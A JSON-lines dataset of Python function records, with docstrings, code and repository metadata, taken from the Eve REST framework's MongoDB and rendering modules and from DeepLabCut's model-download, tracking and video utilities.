{"docstring": "\"\"\"Removes a document or the entire set of documents from a\ncollection.\n\n.. versionchanged:: 0.6.1\n   Support for PyMongo 3.0.\n\n.. versionchanged:: 0.6\n   Support for multiple databases.\n\n.. versionchanged:: 0.3\n   Support lookup arg, which allows to properly delete sub-resources\n   (only delete documents that meet a certain constraint).\n\n.. versionchanged:: 0.2\n   Don't explicitly converto ID_FIELD to ObjectId anymore, so we can\n   also process different types (UUIDs etc).\n\n.. versionchanged:: 0.0.9\n   More informative error messages.\n\n.. versionchanged:: 0.0.8\n   'write_concern' support.\n\n.. versionchanged:: 0.0.6\n   projection queries ('?projection={\"name\": 1}')\n\n.. versionchanged:: 0.0.4\n   retrieves the target collection via the new config.SOURCES helper.\n\n.. versionadded:: 0.0.2\n    Support for deletion of entire documents collection.\n:returns\n    A document (dict) describing the effect of the remove\n    or None if write acknowledgement is disabled.\n\"\"\"\n", "func_signal": "def remove(self, resource, lookup):\n", "code": "lookup = self._mongotize(lookup, resource)\ndatasource, filter_, _, _ = self._datasource_ex(resource, lookup)\n\ncoll = self.get_collection_with_write_concern(datasource, resource)\ntry:\n    coll.delete_many(filter_)\nexcept pymongo.errors.OperationFailure as e:\n    # see comment in :func:`insert()`.\n    self.app.logger.exception(e)\n    abort(\n        500,\n        description=debug_error_message(\n            \"pymongo.errors.OperationFailure: %s\" % e\n        ),\n    )", "path": "eve/eve/io/mongo/mongo.py", "commit_date": "2020-10-06 00:00:00", "repo_name": "pyeve/eve", "stars": 6654, "license": "other", "language": "python", "size": 19340}
{"docstring": "\"\"\"Returns the best match between the requested mime type and the\nones supported by Eve. Along with the mime, also the corresponding\nrender function is returns.\n\n.. versionchanged:: 0.8\n   Support for optional renderers via RENDERERS. XML and JSON\n   configuration keywords removed.\n\n.. versionchanged:: 0.3\n   Support for optional renderers via XML and JSON configuration keywords.\n\"\"\"\n", "func_signal": "def _best_mime():\n", "code": "supported = []\nrenders = {}\nfor renderer_cls in app.config.get(\"RENDERERS\"):\n    renderer = import_from_string(renderer_cls)\n    for mime_type in renderer.mime:\n        supported.append(mime_type)\n        renders[mime_type] = renderer\n\nif len(supported) == 0:\n    abort(\n        500,\n        description=debug_error_message(\n            \"Configuration error: no supported mime types\"\n        ),\n    )\n\nbest_match = request.accept_mimetypes.best_match(supported) or supported[0]\nreturn best_match, renders[best_match]", "path": "eve/eve/render.py", "commit_date": "2020-09-19 00:00:00", "repo_name": "pyeve/eve", "stars": 6654, "license": "other", "language": "python", "size": 19340}
{"docstring": "\"\"\"Make sure 'mongo_indexes' is respected and mongo indexes are created on\nthe current database.\n\n.. versionaddded:: 0.8\n\"\"\"\n", "func_signal": "def ensure_mongo_indexes(app, resource):\n", "code": "mongo_indexes = app.config[\"DOMAIN\"][resource][\"mongo_indexes\"]\nif not mongo_indexes:\n    return\n\nfor name, value in mongo_indexes.items():\n    if isinstance(value, tuple):\n        list_of_keys, index_options = value\n    else:\n        list_of_keys = value\n        index_options = {}\n\n    _create_index(app, resource, name, list_of_keys, index_options)", "path": "eve/eve/io/mongo/mongo.py", "commit_date": "2020-10-06 00:00:00", "repo_name": "pyeve/eve", "stars": 6654, "license": "other", "language": "python", "size": 19340}
{"docstring": "\"\"\"Converts the contents of a `ParsedRequest`'s `where` property to\na dict\n\"\"\"\n", "func_signal": "def _convert_where_request_to_dict(self, resource, req):\n", "code": "query = {}\nif req and req.where:\n    try:\n        query = self._sanitize(resource, json.loads(req.where))\n    except HTTPException:\n        # _sanitize() is raising an HTTP exception; let it fire.\n        raise\n    except:\n        # couldn't parse as mongo query; give the python parser a shot.\n        try:\n            query = parse(req.where)\n        except ParseError:\n            abort(\n                400,\n                description=debug_error_message(\n                    \"Unable to parse `where` clause\"\n                ),\n            )\nreturn query", "path": "eve/eve/io/mongo/mongo.py", "commit_date": "2020-10-06 00:00:00", "repo_name": "pyeve/eve", "stars": 6654, "license": "other", "language": "python", "size": 19340}
{"docstring": "\"\"\"Returns opening tag for XML field element node.\n\n:param field: field name for the element node\n:param idx: the index in the data relation links if serializing a list of same field to XML\n:param related_links: a dictionary that stores all data relation links\n\n.. versionadded:: 0.8.2\n\"\"\"\n", "func_signal": "def xml_field_open(cls, field, idx, related_links):\n", "code": "if field in related_links:\n    if isinstance(related_links[field], list):\n        return '<%s href=\"%s\" title=\"%s\">' % (\n            field,\n            utils.escape(related_links[field][idx][\"href\"]),\n            related_links[field][idx][\"title\"],\n        )\n    else:\n        return '<%s href=\"%s\" title=\"%s\">' % (\n            field,\n            utils.escape(related_links[field][\"href\"]),\n            related_links[field][\"title\"],\n        )\nelse:\n    return \"<%s>\" % field", "path": "eve/eve/render.py", "commit_date": "2020-09-19 00:00:00", "repo_name": "pyeve/eve", "stars": 6654, "license": "other", "language": "python", "size": 19340}
{"docstring": "\"\"\"JSON render function\n\n:param data: the data stream to be rendered as json.\n\n.. versionchanged:: 0.2\n   Json encoder class is now inferred by the active data layer,\n   allowing for customized, data-aware JSON encoding.\n\n.. versionchanged:: 0.1.0\n   Support for optional HATEOAS.\n\"\"\"\n", "func_signal": "def render(self, data):\n", "code": "set_indent = None\n\n# make pretty prints available\nif \"GET\" in request.method and \"pretty\" in request.args:\n    set_indent = 4\nreturn json.dumps(\n    data,\n    indent=set_indent,\n    cls=app.data.json_encoder_class,\n    sort_keys=config.JSON_SORT_KEYS,\n)", "path": "eve/eve/render.py", "commit_date": "2020-09-19 00:00:00", "repo_name": "pyeve/eve", "stars": 6654, "license": "other", "language": "python", "size": 19340}
{"docstring": "\"\"\"Represents a single resource (member of a collection) as XML.\n\n:param data: the data stream to be rendered as xml.\n\n.. versionadded:: 0.0.3\n\"\"\"\n", "func_signal": "def xml_item(cls, item):\n", "code": "xml = cls.xml_root_open(item)\nxml += cls.xml_add_links(item)\nxml += cls.xml_dict(item)\nxml += cls.xml_root_close()\nreturn xml", "path": "eve/eve/render.py", "commit_date": "2020-09-19 00:00:00", "repo_name": "pyeve/eve", "stars": 6654, "license": "other", "language": "python", "size": 19340}
{"docstring": "\"\"\"Returns as many <link> nodes as there are in the datastream. The\nadded links are then removed from the datastream to allow for further\nprocessing.\n\n:param data: the data stream to be rendered as xml.\n\n.. versionchanged:: 0.8.2\n   Keep data relation links in the datastream as they will be\n   processed as node attributes in xml_dict\n\n.. versionchanged:: 0.5\n   Always return ordered items (#441).\n\n.. versionchanged:: 0.0.6\n   Links are now properly escaped.\n\n.. versionadded:: 0.0.3\n\"\"\"\n", "func_signal": "def xml_add_links(cls, data):\n", "code": "xml = \"\"\nchunk = '<link rel=\"%s\" href=\"%s\" title=\"%s\" />'\nlinks = data.pop(config.LINKS, {})\nordered_links = OrderedDict(sorted(links.items()))\nfor rel, link in ordered_links.items():\n    if rel == \"related\":\n        # add data relation links back for\n        # future processing of hateoas attributes\n        data.update({config.LINKS: {rel: link}})\n\n    elif isinstance(link, list):\n        xml += \"\".join(\n            chunk % (rel, utils.escape(d[\"href\"]), utils.escape(d[\"title\"]))\n            for d in link\n        )\n    else:\n        xml += \"\".join(chunk % (rel, utils.escape(link[\"href\"]), link[\"title\"]))\nreturn xml", "path": "eve/eve/render.py", "commit_date": "2020-09-19 00:00:00", "repo_name": "pyeve/eve", "stars": 6654, "license": "other", "language": "python", "size": 19340}
{"docstring": "\"\"\"Makes sure that only allowed operators are included in the query,\naborts with a 400 otherwise.\n\n.. versionchanged:: 1.1.0\n   Add mongo_query_whitelist config option to extend the list of\n   supported operators\n\n.. versionchanged:: 0.5\n   Abort with 400 if unsupported query operators are used. #387.\n   DRY.\n\n.. versionchanged:: 0.0.9\n   More informative error messages.\n   Allow ``auth_username_field`` to be set to ``ID_FIELD``.\n\n.. versionadded:: 0.0.7\n\"\"\"\n\n", "func_signal": "def _sanitize(self, resource, spec):\n", "code": "def sanitize_keys(spec):\n    ops = set([op for op in spec.keys() if op[0] == \"$\"])\n    known = Mongo.operators | set(\n        config.DOMAIN[resource][\"mongo_query_whitelist\"]\n    )\n\n    unknown = ops - known\n    if unknown:\n        abort(\n            400,\n            description=debug_error_message(\n                \"Query contains unknown or unsupported operators: %s\"\n                % \", \".join(unknown)\n            ),\n        )\n\n    if set(spec.keys()) & set(config.MONGO_QUERY_BLACKLIST):\n        abort(\n            400,\n            description=debug_error_message(\n                \"Query contains operators banned in MONGO_QUERY_BLACKLIST\"\n            ),\n        )\n\nif isinstance(spec, dict):\n    sanitize_keys(spec)\n    for value in spec.values():\n        self._sanitize(resource, value)\nif isinstance(spec, list):\n    for value in spec:\n        self._sanitize(resource, value)\n\nreturn spec", "path": "eve/eve/io/mongo/mongo.py", "commit_date": "2020-10-06 00:00:00", "repo_name": "pyeve/eve", "stars": 6654, "license": "other", "language": "python", "size": 19340}
{"docstring": "\"\"\"Retrieves a list of documents from the collection given\nby `resource`, matching the given list of ids.\n\nThis query is generated to *preserve the order* of the elements\nin the `ids` list. An alternative would be to use the `$in` operator\nand accept non-dependable ordering for a slight performance boost\nsee <https://jira.mongodb.org/browse/SERVER-7528?focusedCommentId=\n181518&page=com.atlassian.jira.plugin.system.issuetabpanels:comment\n-tabpanel#comment-181518>\n\nTo preserve order, we use a query of the form\n    db.collection.find( { $or:[ { _id:ObjectId(...) },\n        { _id:ObjectId(...) }...] } )\n\nInstead of the simpler\n    {'_id': {'$in': ids}}\n\n-- via http://stackoverflow.com/a/13185509/1161906\n\n:param resource: resource name.\n:param ids: a list of ObjectIds corresponding to the documents\nto retrieve\n:param client_projection: a specific projection to use\n:return: a list of documents matching the ids in `ids` from the\ncollection specified in `resource`\n\n.. versionchanged:: 0.6\n   Support for multiple databases.\n\n.. versionchanged:: 0.1.1\n   Using config.ID_FIELD instead of hard coded '_id'.\n\n.. versionadded:: 0.1.0\n\"\"\"\n", "func_signal": "def find_list_of_ids(self, resource, ids, client_projection=None):\n", "code": "id_field = config.DOMAIN[resource][\"id_field\"]\nquery = {\"$or\": [{id_field: id_} for id_ in ids]}\n\ndatasource, spec, projection, _ = self._datasource_ex(\n    resource, query=query, client_projection=client_projection\n)\n# projection of {} return all fields in MongoDB, but\n# pymongo will only return `_id`. It's a design flaw upstream.\n# Here, we feed pymongo with `None` if projection is empty.\ndocuments = (\n    self.pymongo(resource)\n    .db[datasource]\n    .find(filter=spec, projection=(projection or None))\n)\nreturn documents", "path": "eve/eve/io/mongo/mongo.py", "commit_date": "2020-10-06 00:00:00", "repo_name": "pyeve/eve", "stars": 6654, "license": "other", "language": "python", "size": 19340}
{"docstring": "\"\"\"XML render function.\n\n:param data: the data stream to be rendered as xml.\n\n.. versionchanged:: 0.4\n   Support for pagination info (_meta).\n\n.. versionchanged:: 0.2\n   Use the new ITEMS configuration setting.\n\n.. versionchanged:: 0.1.0\n   Support for optional HATEOAS.\n\n.. versionchanged:: 0.0.3\n   Support for HAL-like hyperlinks and resource descriptors.\n\"\"\"\n", "func_signal": "def render(self, data):\n", "code": "if isinstance(data, list):\n    data = {config.ITEMS: data}\n\nxml = \"\"\nif data:\n    xml += self.xml_root_open(data)\n    xml += self.xml_add_links(data)\n    xml += self.xml_add_meta(data)\n    xml += self.xml_add_items(data)\n    xml += self.xml_root_close()\nreturn xml", "path": "eve/eve/render.py", "commit_date": "2020-09-19 00:00:00", "repo_name": "pyeve/eve", "stars": 6654, "license": "other", "language": "python", "size": 19340}
{"docstring": "\"\"\"When this function is called the datastream can only contain\n a `_items` list, or a dictionary. If a list, each item is a resource\nwhich rendered as XML. If a dictionary, it will be rendered as XML.\n\n:param data: the data stream to be rendered as xml.\n\n.. versionadded:: 0.0.3\n\"\"\"\n", "func_signal": "def xml_add_items(cls, data):\n", "code": "try:\n    xml = \"\".join(cls.xml_item(item) for item in data[config.ITEMS])\nexcept:\n    xml = cls.xml_dict(data)\nreturn xml", "path": "eve/eve/render.py", "commit_date": "2020-09-19 00:00:00", "repo_name": "pyeve/eve", "stars": 6654, "license": "other", "language": "python", "size": 19340}
{"docstring": "\"\"\"\n.. versionadded:: 0.7\n\"\"\"\n", "func_signal": "def aggregate(self, resource, pipeline, options):\n", "code": "datasource, _, _, _ = self.datasource(resource)\nchallenge = self._mongotize({\"key\": pipeline}, resource)[\"key\"]\n\nreturn self.pymongo(resource).db[datasource].aggregate(challenge, **options)", "path": "eve/eve/io/mongo/mongo.py", "commit_date": "2020-10-06 00:00:00", "repo_name": "pyeve/eve", "stars": 6654, "license": "other", "language": "python", "size": 19340}
{"docstring": "\"\"\"Retrieves a single raw document.\n\n:param resource: resource name.\n:param **lookup: lookup query.\n\n.. versionchanged:: 0.6\n   Support for multiple databases.\n\n.. versionadded:: 0.4\n\"\"\"\n", "func_signal": "def find_one_raw(self, resource, **lookup):\n", "code": "id_field = config.DOMAIN[resource][\"id_field\"]\n_id = lookup.get(id_field)\ndatasource, filter_, _, _ = self._datasource_ex(resource, {id_field: _id}, None)\n\nlookup = self._mongotize(lookup, resource)\n\nreturn self.pymongo(resource).db[datasource].find_one(lookup)", "path": "eve/eve/io/mongo/mongo.py", "commit_date": "2020-10-06 00:00:00", "repo_name": "pyeve/eve", "stars": 6654, "license": "other", "language": "python", "size": 19340}
{"docstring": "\"\"\"Initialize PyMongo.\n\n.. versionchanged:: 0.6\n   Use mongo_prefix for multidb support.\n\n.. versionchanged:: 0.0.9\n   Support for Python 3.3.\n\"\"\"\n# mongod must be running or this will raise an exception\n", "func_signal": "def init_app(self, app):\n", "code": "self.driver = PyMongos(self)\nself.mongo_prefix = None", "path": "eve/eve/io/mongo/mongo.py", "commit_date": "2020-10-06 00:00:00", "repo_name": "pyeve/eve", "stars": 6654, "license": "other", "language": "python", "size": 19340}
{"docstring": "\"\"\"Returns a pymongo Collection with the desired write_concern\nsetting.\n\nPyMongo 3.0+ collections are immutable, yet we still want to allow the\nmaintainer to change the write concern setting on the fly, hence the\nclone.\n\n.. versionadded:: 0.6.1\n\"\"\"\n", "func_signal": "def get_collection_with_write_concern(self, datasource, resource):\n", "code": "wc = WriteConcern(config.DOMAIN[resource][\"mongo_write_concern\"][\"w\"])\nreturn self.pymongo(resource).db[datasource].with_options(write_concern=wc)", "path": "eve/eve/io/mongo/mongo.py", "commit_date": "2020-10-06 00:00:00", "repo_name": "pyeve/eve", "stars": 6654, "license": "other", "language": "python", "size": 19340}
{"docstring": "\"\"\"For the specified field name, parses the query and returns\nthe value being assigned in the query.\n\nFor example,\n    get_value_from_query({'_id': 123}, '_id')\n123\n\nThis mainly exists to deal with more complicated compound queries\n    get_value_from_query(\n        {'$and': [{'_id': 123}, {'firstname': 'mike'}],\n        '_id'\n    )\n123\n\n.. versionadded: 0.1.0\n   Support for parsing values embedded in compound db queries\n\"\"\"\n", "func_signal": "def get_value_from_query(self, query, field_name):\n", "code": "if field_name in query:\n    return query[field_name]\nelif \"$and\" in query:\n    for condition in query[\"$and\"]:\n        if field_name in condition:\n            return condition[field_name]\nraise KeyError", "path": "eve/eve/io/mongo/mongo.py", "commit_date": "2020-10-06 00:00:00", "repo_name": "pyeve/eve", "stars": 6654, "license": "other", "language": "python", "size": 19340}
{"docstring": "\"\"\"\nDownloads a DeepLabCut Model Zoo Project\n\"\"\"\n", "func_signal": "def DownloadModel(modelname, target_dir):\n", "code": "import urllib.request\nimport tarfile\nfrom tqdm import tqdm\n\ndef show_progress(count, block_size, total_size):\n    pbar.update(block_size)\n\ndef tarfilenamecutting(tarf):\n    \"\"\"' auxfun to extract folder path\n    ie. /xyz-trainsetxyshufflez/\n    \"\"\"\n    for memberid, member in enumerate(tarf.getmembers()):\n        if memberid == 0:\n            parent = str(member.path)\n            l = len(parent) + 1\n        if member.path.startswith(parent):\n            member.path = member.path[l:]\n            yield member\n\ndlc_path = auxiliaryfunctions.get_deeplabcut_path()\nneturls = auxiliaryfunctions.read_plainconfig(\n    os.path.join(\n        dlc_path,\n        \"pose_estimation_tensorflow\",\n        \"models\",\n        \"pretrained\",\n        \"pretrained_model_urls.yaml\",\n    )\n)\nif modelname in neturls.keys():\n    url = neturls[modelname]\n    response = urllib.request.urlopen(url)\n    print(\n        \"Downloading the model from the DeepLabCut server @Harvard -> Go Crimson!!! {}....\".format(\n            url\n        )\n    )\n    total_size = int(response.getheader(\"Content-Length\"))\n    pbar = tqdm(unit=\"B\", total=total_size, position=0)\n    filename, _ = urllib.request.urlretrieve(url, reporthook=show_progress)\n    with tarfile.open(filename, mode=\"r:gz\") as tar:\n        tar.extractall(target_dir, members=tarfilenamecutting(tar))\nelse:\n    models = [\n        fn\n        for fn in neturls.keys()\n        if \"resnet_\" not in fn and \"mobilenet_\" not in fn\n    ]\n    print(\"Model does not exist: \", modelname)\n    print(\"Pick one of the following: \", models)", "path": "DeepLabCut/deeplabcut/utils/auxfun_models.py", "commit_date": "2020-05-30 00:00:00", "repo_name": "DeepLabCut/DeepLabCut", "stars": 4196, "license": "lgpl-3.0", "language": "python", "size": 172443}
{"docstring": "# Find the most 'complete' animal\n", "func_signal": "def pick_labeled_frame(self):\n", "code": "try:\n    count = self.df.groupby(level=\"individuals\", axis=1).count()\n    if \"single\" in count:\n        count.drop(\"single\", axis=1, inplace=True)\nexcept KeyError:\n    count = self.df.count(axis=1).to_frame()\nmask = count.where(count == count.values.max())\nkept = mask.stack().index.to_list()\nnp.random.shuffle(kept)\nrow, col = kept.pop()\nreturn row, col", "path": "DeepLabCut/deeplabcut/utils/skeleton.py", "commit_date": "2020-09-24 00:00:00", "repo_name": "DeepLabCut/DeepLabCut", "stars": 4196, "license": "lgpl-3.0", "language": "python", "size": 172443}
{"docstring": "\"\"\"\nInteractively select the cropping area of all videos in the config.\nA user interface pops up with a frame to select the cropping parameters.\nUse the left click to draw a box and hit the button 'set cropping parameters'\nto store the cropping parameters for a video in the config.yaml file.\n\nParameters\n----------\nconfig : string\n    Full path of the config.yaml file as a string.\n\nvideos : optional (default=None)\n    List of videos whose cropping areas are to be defined. Note that full paths are required.\n    By default, all videos in the config are successively loaded.\n\nReturns\n-------\ncfg : dict\n    Updated project configuration\n\"\"\"\n", "func_signal": "def select_cropping_area(config, videos=None):\n", "code": "from deeplabcut.utils import auxiliaryfunctions, auxfun_videos\n\ncfg = auxiliaryfunctions.read_config(config)\nif videos is None:\n    videos = cfg[\"video_sets\"]\n\nfor video in videos:\n    coords = auxfun_videos.draw_bbox(video)\n    if coords:\n        cfg[\"video_sets\"][video] = {\n            \"crop\": \", \".join(\n                map(\n                    str,\n                    [\n                        int(coords[0]),\n                        int(coords[2]),\n                        int(coords[1]),\n                        int(coords[3]),\n                    ],\n                )\n            )\n        }\n\nauxiliaryfunctions.write_config(config, cfg)\nreturn cfg", "path": "DeepLabCut/deeplabcut/generate_training_dataset/frame_extraction.py", "commit_date": "2020-09-09 00:00:00", "repo_name": "DeepLabCut/DeepLabCut", "stars": 4196, "license": "lgpl-3.0", "language": "python", "size": 172443}
{"docstring": "\"\"\" Returns the training and test pose config file names as well as the folder where the snapshot is\nParameters\n----------\nconfig : string\n    Full path of the config.yaml file as a string.\n\nshuffle: int\n    Integer value specifying the shuffle index to select for training.\n\ntrainingsetindex: int, optional\n    Integer specifying which TrainingsetFraction to use. By default the first (note that TrainingFraction is a list in config.yaml).\n\nReturns the triple: trainposeconfigfile, testposeconfigfile, snapshotfolder\n\"\"\"\n", "func_signal": "def return_train_network_path(config, shuffle=1, trainingsetindex=0, modelprefix=\"\"):\n", "code": "from deeplabcut.utils import auxiliaryfunctions\n\ncfg = auxiliaryfunctions.read_config(config)\nmodelfoldername = auxiliaryfunctions.GetModelFolder(\n    cfg[\"TrainingFraction\"][trainingsetindex], shuffle, cfg, modelprefix=modelprefix\n)\ntrainposeconfigfile = Path(\n    os.path.join(\n        cfg[\"project_path\"], str(modelfoldername), \"train\", \"pose_cfg.yaml\"\n    )\n)\ntestposeconfigfile = Path(\n    os.path.join(cfg[\"project_path\"], str(modelfoldername), \"test\", \"pose_cfg.yaml\")\n)\nsnapshotfolder = Path(\n    os.path.join(cfg[\"project_path\"], str(modelfoldername), \"train\")\n)\n\nreturn trainposeconfigfile, testposeconfigfile, snapshotfolder", "path": "DeepLabCut/deeplabcut/pose_estimation_tensorflow/training.py", "commit_date": "2020-05-22 00:00:00", "repo_name": "DeepLabCut/DeepLabCut", "stars": 4196, "license": "lgpl-3.0", "language": "python", "size": 172443}
{"docstring": "\"\"\"\nAssigns detections to tracked object (both represented as bounding boxes)\n\nReturns 3 lists of matches, unmatched_detections and unmatched_trackers\n\"\"\"\n", "func_signal": "def associate_detections_to_trackers(detections, trackers, iou_threshold):\n", "code": "if not len(trackers):\n    return (\n        np.empty((0, 2), dtype=int),\n        np.arange(len(detections)),\n        np.empty((0, 5), dtype=int),\n    )\niou_matrix = np.zeros((len(detections), len(trackers)), dtype=np.float32)\n\nfor d, det in enumerate(detections):\n    for t, trk in enumerate(trackers):\n        iou_matrix[d, t] = iou(det, trk)\nrow_indices, col_indices = linear_sum_assignment(-iou_matrix)\n\nunmatched_detections = []\nfor d, det in enumerate(detections):\n    if d not in row_indices:\n        unmatched_detections.append(d)\nunmatched_trackers = []\nfor t, trk in enumerate(trackers):\n    if t not in col_indices:\n        unmatched_trackers.append(t)\n\n# filter out matched with low IOU\nmatches = []\nfor row, col in zip(row_indices, col_indices):\n    if iou_matrix[row, col] < iou_threshold:\n        unmatched_detections.append(row)\n        unmatched_trackers.append(col)\n    else:\n        matches.append([row, col])\nif not len(matches):\n    matches = np.empty((0, 2), dtype=int)\nelse:\n    matches = np.stack(matches)\nreturn matches, np.array(unmatched_detections), np.array(unmatched_trackers)", "path": "DeepLabCut/deeplabcut/pose_estimation_tensorflow/lib/trackingutils.py", "commit_date": "2020-05-30 00:00:00", "repo_name": "DeepLabCut/DeepLabCut", "stars": 4196, "license": "lgpl-3.0", "language": "python", "size": 172443}
{"docstring": "# TODO Try particle filter (since we already have the keypoints)\n", "func_signal": "def __init__(self, n_bodyparts):\n", "code": "self.kf = kinematic_kf(\n    n_bodyparts * 2, order=1, dim_z=n_bodyparts, order_by_dim=False\n)\nself.kf.Q[self.kf.dim_z :, self.kf.dim_z :] *= 10\nself.kf.R[self.kf.dim_z :, self.kf.dim_z :] *= 0.01\nself.kf.P[self.kf.dim_z :, self.kf.dim_z :] *= 1000\nself.id = SkeletonTracker.n_trackers\nSkeletonTracker.n_trackers += 1\nself.time_since_update = 0\nself.age = 0\nself.hits = 0\nself.hit_streak = 0", "path": "DeepLabCut/deeplabcut/pose_estimation_tensorflow/lib/trackingutils.py", "commit_date": "2020-05-30 00:00:00", "repo_name": "DeepLabCut/DeepLabCut", "stars": 4196, "license": "lgpl-3.0", "language": "python", "size": 172443}
{"docstring": "\"\"\"\nInitialises a tracker using initial bounding box.\n\"\"\"\n# define constant velocity model\n", "func_signal": "def __init__(self, bbox):\n", "code": "self.kf = KalmanFilter(dim_x=7, dim_z=4)\nself.kf.F = np.array(\n    [\n        [1, 0, 0, 0, 1, 0, 0],\n        [0, 1, 0, 0, 0, 1, 0],\n        [0, 0, 1, 0, 0, 0, 1],\n        [0, 0, 0, 1, 0, 0, 0],\n        [0, 0, 0, 0, 1, 0, 0],\n        [0, 0, 0, 0, 0, 1, 0],\n        [0, 0, 0, 0, 0, 0, 1],\n    ]\n)\nself.kf.H = np.array(\n    [\n        [1, 0, 0, 0, 0, 0, 0],\n        [0, 1, 0, 0, 0, 0, 0],\n        [0, 0, 1, 0, 0, 0, 0],\n        [0, 0, 0, 1, 0, 0, 0],\n    ]\n)\n\nself.kf.R[2:, 2:] *= 10.0\nself.kf.P[\n    4:, 4:\n] *= 1000.0  # give high uncertainty to the unobservable initial velocities\nself.kf.P *= 10.0\nself.kf.Q[-1, -1] *= 0.01\nself.kf.Q[4:, 4:] *= 0.01\n\nself.kf.x[:4] = convert_bbox_to_z(bbox)\nself.time_since_update = 0\nself.id = KalmanBoxTracker.count\nKalmanBoxTracker.count += 1\nself.history = []\nself.hits = 0\nself.hit_streak = 0\nself.age = 0", "path": "DeepLabCut/deeplabcut/pose_estimation_tensorflow/lib/trackingutils.py", "commit_date": "2020-05-30 00:00:00", "repo_name": "DeepLabCut/DeepLabCut", "stars": 4196, "license": "lgpl-3.0", "language": "python", "size": 172443}
{"docstring": "\"\"\"\nAdvances the state vector and returns the predicted bounding box estimate.\n\"\"\"\n", "func_signal": "def predict(self):\n", "code": "if (self.kf.x[6] + self.kf.x[2]) <= 0:\n    self.kf.x[6] *= 0.0\nself.kf.predict()\nself.age += 1\nif self.time_since_update > 0:\n    self.hit_streak = 0\nself.time_since_update += 1\nself.history.append(convert_x_to_bbox(self.kf.x))\nreturn self.history[-1]", "path": "DeepLabCut/deeplabcut/pose_estimation_tensorflow/lib/trackingutils.py", "commit_date": "2020-05-30 00:00:00", "repo_name": "DeepLabCut/DeepLabCut", "stars": 4196, "license": "lgpl-3.0", "language": "python", "size": 172443}
{"docstring": "\"\"\"\nComputes intersection of union (IOU) metric for pair of bboxes in the form [x1,y1,x2,y2]\n\"\"\"\n", "func_signal": "def iou(bb_test, bb_gt):\n", "code": "xx1 = np.maximum(bb_test[0], bb_gt[0])\nyy1 = np.maximum(bb_test[1], bb_gt[1])\nxx2 = np.minimum(bb_test[2], bb_gt[2])\nyy2 = np.minimum(bb_test[3], bb_gt[3])\nw = np.maximum(0.0, xx2 - xx1)\nh = np.maximum(0.0, yy2 - yy1)\nwh = w * h\no = wh / (\n    (bb_test[2] - bb_test[0]) * (bb_test[3] - bb_test[1])\n    + (bb_gt[2] - bb_gt[0]) * (bb_gt[3] - bb_gt[1])\n    - wh\n)\nreturn o", "path": "DeepLabCut/deeplabcut/pose_estimation_tensorflow/lib/trackingutils.py", "commit_date": "2020-05-30 00:00:00", "repo_name": "DeepLabCut/DeepLabCut", "stars": 4196, "license": "lgpl-3.0", "language": "python", "size": 172443}
{"docstring": "\"\"\"\nSplit a video into several shorter ones of equal duration.\n\nParameters\n----------\nn_splits : int\n    Number of shorter videos to produce\n\nsuffix: str, optional\n    String added to the name of the splits ('short' by default).\n\ndest_folder: str, optional\n    Folder the video splits are saved into (by default, same as the original video)\n\nReturns\n-------\nlist\n    Paths of the video splits\n\"\"\"\n", "func_signal": "def split(self, n_splits, suffix=\"split\", dest_folder=None):\n", "code": "if not n_splits > 1:\n    raise ValueError(\"The video should at least be split in half.\")\nchunk_dur = self.calc_duration() / n_splits\nsplits = np.arange(n_splits + 1) * chunk_dur\ntime_formatter = lambda val: str(datetime.timedelta(seconds=val))\nclips = []\nfor n, (start, end) in enumerate(zip(splits, splits[1:]), start=1):\n    clips.append(\n        self.shorten(\n            time_formatter(start),\n            time_formatter(end),\n            f\"{suffix}{n}\",\n            dest_folder,\n            validate_inputs=False,\n        )\n    )\nreturn clips", "path": "DeepLabCut/deeplabcut/utils/auxfun_videos.py", "commit_date": "2020-12-21 00:00:00", "repo_name": "DeepLabCut/DeepLabCut", "stars": 4196, "license": "lgpl-3.0", "language": "python", "size": 172443}
{"docstring": "\"\"\"\nSets key parameters for SORT\n\"\"\"\n", "func_signal": "def __init__(self, cfg):\n", "code": "self.max_age = cfg.get(\"max_age\", 1)\nself.min_hits = cfg.get(\"min_hits\", 3)\nself.trackers = []\nself.frame_count = 0\nself.iou_threshold = cfg.get(\"iou_threshold\", 0.3)", "path": "DeepLabCut/deeplabcut/pose_estimation_tensorflow/lib/trackingutils.py", "commit_date": "2020-05-30 00:00:00", "repo_name": "DeepLabCut/DeepLabCut", "stars": 4196, "license": "lgpl-3.0", "language": "python", "size": 172443}
{"docstring": "\"\"\"\nDownloads the ImageNet pretrained weights for ResNets, MobileNets et al. from TensorFlow...\n\"\"\"\n", "func_signal": "def Downloadweights(modeltype, model_path):\n", "code": "import urllib\nimport tarfile\nfrom io import BytesIO\n\ntarget_dir = model_path.parents[0]\nneturls = auxiliaryfunctions.read_plainconfig(\n    target_dir / \"pretrained_model_urls.yaml\"\n)\ntry:\n    url = neturls[modeltype]\n    print(\"Downloading a ImageNet-pretrained model from {}....\".format(url))\n    response = urllib.request.urlopen(url)\n    with tarfile.open(fileobj=BytesIO(response.read()), mode=\"r:gz\") as tar:\n        tar.extractall(path=target_dir)\nexcept KeyError:\n    print(\"Model does not exist: \", modeltype)\n    print(\"Pick one of the following: \", neturls.keys())", "path": "DeepLabCut/deeplabcut/utils/auxfun_models.py", "commit_date": "2020-05-30 00:00:00", "repo_name": "DeepLabCut/DeepLabCut", "stars": 4196, "license": "lgpl-3.0", "language": "python", "size": 172443}
{"docstring": "\"\"\"Draw a circle on an image using only numpy methods.\"\"\"\n", "func_signal": "def _npcircle(image, cx, cy, radius, color, transparency=0.0):\n", "code": "radius = int(radius)\ncx = int(cx)\ncy = int(cy)\ny, x = np.ogrid[-radius:radius, -radius:radius]\nindex = x ** 2 + y ** 2 <= radius ** 2\nimage[cy - radius : cy + radius, cx - radius : cx + radius][index] = (\n    image[cy - radius : cy + radius, cx - radius : cx + radius][index].astype(\n        \"float32\"\n    )\n    * transparency\n    + np.array(color).astype(\"float32\") * (1.0 - transparency)\n).astype(\"uint8\")", "path": "DeepLabCut/deeplabcut/pose_estimation_tensorflow/util/visualize.py", "commit_date": "2020-05-30 00:00:00", "repo_name": "DeepLabCut/DeepLabCut", "stars": 4196, "license": "lgpl-3.0", "language": "python", "size": 172443}
{"docstring": "\"\"\"\nUpdates the state vector with observed bbox.\n\"\"\"\n", "func_signal": "def update(self, bbox):\n", "code": "self.time_since_update = 0\nself.history = []\nself.hits += 1\nself.hit_streak += 1\nself.kf.update(convert_bbox_to_z(bbox))", "path": "DeepLabCut/deeplabcut/pose_estimation_tensorflow/lib/trackingutils.py", "commit_date": "2020-05-30 00:00:00", "repo_name": "DeepLabCut/DeepLabCut", "stars": 4196, "license": "lgpl-3.0", "language": "python", "size": 172443}
